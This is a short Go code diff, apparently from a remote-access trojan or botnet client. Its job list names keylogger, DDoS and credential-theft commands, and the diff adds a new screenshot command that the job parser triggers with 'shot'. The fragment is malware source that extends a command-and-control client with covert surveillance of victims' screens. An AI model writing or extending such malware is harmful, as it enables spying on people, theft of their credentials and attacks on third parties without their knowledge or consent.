@@ -23,6 +23,7 @@ const (
 	CHDIR
 	SLEEP
 	BOOST
+	SCREENSHOT
 	KEYLOGGER
 	DDOS
 	CREDENTIALS
@@ -52,6 +53,8 @@ func (j *Job) parse() (JobType, []string) {
 		return CHDIR, jobArgs
 	} else if jobType == "msgbox" && n == 2 {
 		return MSG_BOX, jobArgs
+	} else if jobType == "shot" {
+		return SCREENSHOT, nil
 	}
 	return UNKNOWN, nil
 }
